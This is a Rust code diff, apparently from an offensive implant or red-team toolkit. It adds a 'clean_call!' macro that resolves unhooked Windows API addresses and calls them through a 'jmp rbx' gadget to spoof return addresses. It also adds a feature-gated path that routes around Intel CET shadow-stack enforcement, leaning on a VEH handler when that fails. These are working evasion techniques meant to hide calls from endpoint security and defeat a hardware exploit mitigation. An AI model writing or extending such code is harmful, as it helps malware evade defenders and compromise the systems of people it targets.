@@ -2201,7 +2201,67 @@ pub unsafe fn bounded_transmute<D>(val: u64) -> D {
     std::mem::transmute_copy::<u64, D>(&val)
 }
 
-#[cfg(windows)]
+#[cfg(all(windows, feature = "cet-bypass"))]
+#[macro_export]
+macro_rules! clean_call {
+    ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
+        let addr = $crate::syscalls::get_clean_api_addr($dll_name, $func_name)
+            .unwrap_or_else(|e| {
+                log::error!("Failed to resolve clean {}: {}", $func_name, e);
+                return Err(anyhow::anyhow!("Failed to resolve clean {}: {}", $func_name, e));
+            });
+        // Gather arguments
+        let args: &[u64] = &[$($args as u64),*];
+        let arg1 = args.get(0).copied().unwrap_or(0);
+        let arg2 = args.get(1).copied().unwrap_or(0);
+        let arg3 = args.get(2).copied().unwrap_or(0);
+        let arg4 = args.get(3).copied().unwrap_or(0);
+        let stack_args = if args.len() > 4 { &args[4..] } else { &[] };
+
+        // CET check: if CET bypass is enabled and CET is active, check
+        // whether we should use the CET-compatible call-chain approach
+        // instead of the standard spoof_call (which manipulates return
+        // addresses and breaks shadow-stack integrity).
+        let cet_action = $crate::cet_bypass::prepare_spoofing(None);
+        if cet_action == $crate::cet_bypass::CetAction::UseCallChain {
+            // CET is active — use the kernel32 equivalent which maintains
+            // shadow-stack integrity through legitimate call instructions.
+            // Attempt to dispatch via the CET call-chain registry.
+            if let Some(_result) = $crate::cet_bypass::call_via_chain($func_name, args) {
+                // The kernel32 call completed.  Return 0 (success indicator)
+                // cast to the target type.  NOTE: this is a simplified return
+                // — callers that need the actual NTSTATUS should check
+                // GetLastError or use a different path.
+                let _val: u64 = 0;
+                Ok(unsafe { $crate::syscalls::bounded_transmute(_val) })
+            } else {
+                // No call chain registered for this function — fall through
+                // to the standard spoof_call path (will likely trigger a #CP
+                // exception, but the VEH handler may catch it).
+                let gadget = $crate::syscalls::find_jmp_rbx_gadget();
+                if gadget == 0 {
+                    Err($crate::syscalls::SyscallError::NoGadgetAvailable)
+                } else {
+                    let res = unsafe { $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args) };
+                    Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
+                }
+            }
+        } else if cet_action == $crate::cet_bypass::CetAction::Abort {
+            Err(anyhow::anyhow!("CET is active and cannot be bypassed for {}", $func_name))
+        } else {
+            // CET is off or has been disabled — use standard spoof_call.
+            let gadget = $crate::syscalls::find_jmp_rbx_gadget();
+            if gadget == 0 {
+                Err($crate::syscalls::SyscallError::NoGadgetAvailable)
+            } else {
+                let res = unsafe { $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args) };
+                Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
+            }
+        }
+    }};
+}
+
+#[cfg(all(windows, not(feature = "cet-bypass")))]
 #[macro_export]
 macro_rules! clean_call {
     ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
@@ -3304,6 +3364,21 @@ pub unsafe fn spoof_call(
     arg4: u64,
     stack_args: &[u64],
 ) -> u64 {
+    // CET safety check: if CET is active and bypass is compiled in, log a
+    // warning.  The clean_call macro handles routing to CET-compatible paths
+    // before reaching this point, so this warning indicates the caller bypassed
+    // the macro-level CET check.
+    #[cfg(feature = "cet-bypass")]
+    {
+        if crate::cet_bypass::is_cet_active() {
+            log::warn!(
+                "spoof_call: CET shadow stacks are active — return-address manipulation \
+                 may trigger a #CP exception.  Callers should use clean_call! macro \
+                 which routes through CET-compatible paths."
+            );
+        }
+    }
+
     // Stack-spoofing indirect call via a `jmp rbx` gadget in a system DLL.
     //
     // Flow:
